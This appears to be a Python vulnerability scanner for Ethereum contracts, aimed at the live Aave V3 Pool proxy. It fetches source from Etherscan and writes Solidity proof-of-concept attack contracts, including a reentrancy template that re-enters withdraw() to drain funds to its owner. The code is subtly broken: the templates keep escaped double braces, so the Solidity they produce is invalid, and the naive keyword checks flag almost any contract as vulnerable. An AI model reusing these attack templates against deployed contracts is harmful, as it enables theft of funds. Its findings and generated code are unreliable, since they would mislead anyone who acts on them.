#!/usr/bin/env python3
"""
Web3 Security Scout — Enhanced with proxy resolution & PoC generation.

Workflow:
1. Fetch contracts (verified) from Etherscan (or Dune).
2. For each contract:
   a. Detect if proxy (via Etherscan 'Proxy' contract type or EIP-1967 slot).
   b. If proxy, fetch implementation source and evaluate that instead.
   c. Run AI/static analysis to find issues.
   d. For each issue, generate a PoC template (Foundry format) and save.
3. Send alerts, write summary.

Configuration: config.json (see example)
Dependencies: requests, web3.py (for RPC), openrouter (optional)
"""

import json
import time
import logging
from pathlib import Path
from typing import List, Dict, Any, Optional
from datetime import datetime
import requests

# Try to import web3; if not present, we'll use Etherscan-only proxy detection
try:
    from web3 import Web3
    HAS_WEB3 = True
except ImportError:
    HAS_WEB3 = False

# Cache: known proxy address (lowercase) -> local implementation source file path (relative to workspace)
PROXY_CACHE = {
    "0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2": "cached_aave_v3_impl.sol"
}

# ----------------------------------------------------------------------
# Config & Setup
# ----------------------------------------------------------------------
CONFIG_PATH = Path("config.json")
LOG_FILE = Path("logs/scanner.log")
REPORTS_DIR = Path("reports")
REPORTS_DIR.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)

def load_config() -> Dict[str, Any]:
    if not CONFIG_PATH.exists():
        raise FileNotFoundError(
            f"Config file {CONFIG_PATH} not found. "
            "Copy config.example.json to config.json and fill values."
        )
    with open(CONFIG_PATH) as f:
        return json.load(f)

config = load_config()

# Initialize Etherscan client (simple HTTP)
ETHERSCAN_API = config["etherscan_api_key"]
ETHERSCAN_URL = "https://api.etherscan.io/api"

# Optional: Web3 for storage slot check
w3 = None
if config.get("alchemy_rpc_url") and HAS_WEB3:
    w3 = Web3(Web3.HTTPProvider(config["alchemy_rpc_url"]))

# ----------------------------------------------------------------------
# Etherscan Helpers
# ----------------------------------------------------------------------
def is_proxy_via_etherscan(address: str) -> bool:
    """Check Etherscan's source code response for 'Proxy' contract type."""
    params = {
        "module": "contract",
        "action": "getsourcecode",
        "address": address,
        "apikey": ETHERSCAN_API
    }
    try:
        resp = requests.get(ETHERSCAN_URL, params=params, timeout=10).json()
        if resp["status"] != "1":
            return False
        result = resp["result"][0]
        contract_type = result.get("contracttype", "").lower()
        # Common proxy types: 'Proxy', 'Upgradeable Proxy', 'Transparent Proxy', etc.
        return "proxy" in contract_type
    except Exception as e:
        logging.warning(f"Etherscan proxy check failed for {address}: {e}")
        return False

def get_implementation_address(address: str) -> Optional[str]:
    """
    For a proxy, find the implementation address.
    Tries:
    1. Etherscan 'implementation' field in getsourcecode (if available)
    2. EIP-1967 slot 0x360894a13ba1a3210667c828492cd3d9e4f388f3
    """
    # Method 1: Etherscan API returns implementation address in some cases
    params = {
        "module": "contract",
        "action": "getsourcecode",
        "address": address,
        "apikey": ETHERSCAN_API
    }
    try:
        resp = requests.get(ETHERSCAN_URL, params=params, timeout=10).json()
        if resp["status"] == "1":
            result = resp["result"][0]
            impl_addr = result.get("Implementation", "").strip()
            if Web3.is_address(impl_addr):
                return impl_addr
    except Exception as e:
        logging.warning(f"Etherscan impl fetch error: {e}")

    # Method 2: Read storage slot if we have RPC
    if w3:
        try:
            slot = w3.eth.get_storage_at(address, 0x360894a13ba1a3210667c828492cd3d9e4f388f3)
            # The slot stores the implementation address in the lower 160 bits
            raw = w3.to_hex(slot)
            # Strip '0x' and take last 40 hex chars (20 bytes)
            addr_hex = raw[-40:]
            candidate = w3.to_checksum_address("0x" + addr_hex)
            # Validate it's a contract with source code (quick check)
            if candidate != address:
                return candidate
        except Exception as e:
            logging.warning(f"Storage slot read failed: {e}")

    return None

def fetch_source_code(address: str) -> str:
    """Fetch Solidity source from Etherscan, with optional local cache for known proxies."""
    # Check cache first (case-insensitive address)
    addr_lower = address.lower()
    if addr_lower in PROXY_CACHE:
        cache_file = REPORTS_DIR.parent / PROXY_CACHE[addr_lower]  # repo root
        if cache_file.exists():
            logging.info(f"Loading cached source for {address} from {cache_file}")
            return cache_file.read_text()
        else:
            logging.warning(f"Cache entry for {address} but file not found: {cache_file}")

    # Fall back to Etherscan API
    params = {
        "module": "contract",
        "action": "getsourcecode",
        "address": address,
        "apikey": ETHERSCAN_API
    }
    try:
        resp = requests.get(ETHERSCAN_URL, params=params, timeout=10).json()
        if resp["status"] != "1":
            return ""
        result = resp["result"][0]
        # Multiple files? Usually result[0].SourceCode is a string or a JSON string
        source = result.get("SourceCode", "")
        if source.startswith("{"):
            # Sometimes it's a JSON string with contractName->source mapping
            try:
                parsed = json.loads(source)
                # Concatenate all sources (we'll just join them)
                parts = []
                for name, code in parsed.items():
                    parts.append(f"// File: {name}\n{code}")
                source = "\n\n".join(parts)
            except json.JSONDecodeError:
                pass  # leave as-is
        return source
    except Exception as e:
        logging.error(f"Failed to fetch source for {address}: {e}")
        return ""

# ----------------------------------------------------------------------
# Analysis (placeholder AI)
# ----------------------------------------------------------------------
def evaluate_vulnerability(source_code: str, contract_address: str = "") -> Dict[str, Any]:
    """
    Heuristic analysis to spot common vulnerability patterns.
    Returns dict with severity_score, issues, confidence, bug_type.
    """
    issues = []
    severity = 0.0
    bug_type = None

    patterns = {
        "unchecked_low_level_call": (["call{", ".call("], 3.0),
        "reentrancy": (["call{", ".call(", "value:"], 4.0),
        "tx.origin": (["tx.origin"], 2.5),
        "selfdestruct": (["selfdestruct", "suicide"], 4.5),
        "integer_overflow": (["unchecked", "++", "--"], 2.0)  # naive
    }

    lines = source_code.splitlines()
    for btype, (keywords, score) in patterns.items():
        found = False
        for kw in keywords:
            for line in lines:
                if kw in line:
                    if btype == "unchecked_low_level_call":
                        # Exclude safe patterns: require after call on same line
                        after_kw = line.split(kw, 1)[1] if kw in line else ""
                        if "require(" in after_kw:
                            continue  # likely safe
                    # For reentrancy we don't filter yet
                    issues.append(f"Potential {btype} pattern detected: '{kw}'")
                    severity = max(severity, score)
                    bug_type = btype
                    found = True
                    break
            if found:
                break

    confidence = 0.7 if issues else 0.95
    return {
        "severity_score": severity,
        "issues": issues,
        "confidence": confidence,
        "bug_type": bug_type or "unknown"
    }

# ----------------------------------------------------------------------
# PoC Generator
# ----------------------------------------------------------------------
POC_TEMPLATES = {
    "unchecked_low_level_call": """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract UncheckedLowLevelCallPoC {{
    address public victim;
    address public owner;

    constructor(address _victim) {{
        victim = _victim;
        owner = msg.sender;
    }}

    function attack() external {{
        require(msg.sender == owner, "Not owner");
        // The vulnerable function likely uses `call` without checking return data.
        // We call it directly to trigger the issue.
        bytes memory payload = abi.encodeWithSignature(
            "vulnerableFunction(address,uint256)",  // <-- replace with real signature
            victim,
            1 ether  // <-- adjust params
        );
        (bool success, bytes memory ret) = victim.call{{value: 0}}(payload);
        // If the victim's function returns false but state changed anyway, that's the bug.
        require(success, "Call failed"); // In the bug, success might be false but damage done
    }}

    // Cleanup: withdraw any sent ETH (for demo)
    function cleanup() external {{
        payable(owner).transfer(address(this).balance);
    }}

    receive() external payable {{}}
}}
""",
    "reentrancy": """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyPoC {{
    address public victim;
    address public owner;
    uint256 public balance;

    constructor(address _victim) {{
        victim = _victim;
        owner = msg.sender;
    }}

    function deposit() external payable {{
        balance += msg.value;
    }}

    function attack() external {{
        require(msg.sender == owner, "Not owner");
        // Initiate call to vulnerable function that does state change after external call
        bytes memory payload = abi.encodeWithSignature(
            "withdraw(uint256)",
            1 ether
        );
        victim.call{{value: 0}}(payload);
    }}

    // This function would be called by victim during the external call (if it uses call to this contract)
    // For a full PoC you'd also need a malicious contract that reenters.
    receive() external payable {{
        if (address(victim).balance >= 1 ether) {{
            // Reenter to drain more
            bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 1 ether);
            victim.call{{value: 0}}(payload);
        }}
    }}

    function cleanup() external {{
        payable(owner).transfer(address(this).balance);
    }}
}}
""",
    "default": """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GenericPoC {{
    address public victim;
    address public owner;

    constructor(address _victim) {{
        victim = _victim;
        owner = msg.sender;
    }}

    function trigger() external {{
        require(msg.sender == owner, "Not owner");
        // TODO: Craft payload for the vulnerable function identified.
        bytes memory payload = abi.encodeWithSignature(
            "FUNCTION_SIGNATURE_HERE",
            // ARGS_HERE
        );
        (bool success, bytes memory ret) = victim.call{{value: 0}}(payload);
        require(success);
    }}

    receive() external payable {{}}
}}
"""
}

def generate_poc(bug_type: str, victim_address: str, extra: Dict[str, Any] = None) -> str:
    """Generate a PoC Solidity file based on bug type."""
    template = POC_TEMPLATES.get(bug_type, POC_TEMPLATES["default"])
    # Replace placeholders
    # In a full system, you could also fetch the ABI and generate exact encode calls
    content = template.replace("FUNCTION_SIGNATURE_HERE", "functionName(args)").replace("ARGS_HERE", "arg1, arg2")
    return content

# ----------------------------------------------------------------------
# Alerting (simplified)
# ----------------------------------------------------------------------
def send_discord_alert(webhook_url: str, finding: Dict):
    """Send a formatted alert to Discord (placeholder)."""
    # In production, build a nice embed
    logging.info(f"Discord alert would be sent: {finding['bug_type']} on {finding['address']}")

# ----------------------------------------------------------------------
# Main Scanning Loop
# ----------------------------------------------------------------------
def fetch_contracts(limit: int = 50) -> List[Dict]:
    """
    Target specific high-value contracts. Replace with real Etherscan query as needed.
    """
    logging.info("Fetching target contracts...")
    # Aave V3 Pool Proxy (Ethereum mainnet)
    return [
        {"address": "0x87870Bca3F3fD6335C3f4ce8392D69350b4fA4E2", "name": "Aave V3 Pool Proxy"}
    ]

def process_contract(contract: Dict) -> Optional[Dict]:
    addr = contract["address"]
    logging.info(f"Processing {addr}...")

    # 1. Check proxy
    proxy = is_proxy_via_etherscan(addr)
    target_addr = addr
    if proxy:
        impl = get_implementation_address(addr)
        if impl:
            logging.info(f"Proxy detected; implementation: {impl}")
            target_addr = impl
        else:
            logging.warning(f"Proxy but no impl found; scanning proxy itself anyway.")

    # 2. Fetch source
    source = fetch_source_code(target_addr)
    if not source:
        logging.warning(f"No source for {target_addr}; skipping.")
        return None

    # 3. Evaluate (AI/static)
    result = evaluate_vulnerability(source, target_addr)
    if result["severity_score"] < config.get("min_severity_score", 1.0):
        logging.info(f"No high enough severity for {target_addr}.")
        return None

    # 4. Generate PoC
    poc_path = REPORTS_DIR / f"poc_{target_addr}_{result['bug_type']}.sol"
    poc_content = generate_poc(result["bug_type"], target_addr)
    poc_path.write_text(poc_content)

    # 5. Build finding dict
    finding = {
        "address": target_addr,
        "original_proxy": addr if proxy else None,
        "severity_score": result["severity_score"],
        "issues": result["issues"],
        "confidence": result["confidence"],
        "bug_type": result["bug_type"],
        "poc_path": str(poc_path),
        "timestamp": datetime.utcnow().isoformat()
    }
    logging.info(f"Found {result['bug_type']} on {target_addr}. PoC: {poc_path}")
    return finding

def main():
    logging.info("Web3 Security Scout — advanced mode (proxy + PoC) starting...")
    contracts = fetch_contracts(limit=config.get("max_batch_size", 50))
    findings = []
    for c in contracts:
        try:
            f = process_contract(c)
            if f:
                findings.append(f)
        except Exception as e:
            logging.error(f"Error processing {c['address']}: {e}")

    logging.info(f"Total actionable findings: {len(findings)}")
    # Send Discord alerts for each
    for f in findings:
        send_discord_alert(config["discord_webhook"], f)
    # Optionally write summary JSON
    summary_path = REPORTS_DIR / "summary.json"
    summary_path.write_text(json.dumps(findings, indent=2))
    logging.info(f"Summary written to {summary_path}")

if __name__ == "__main__":
    main()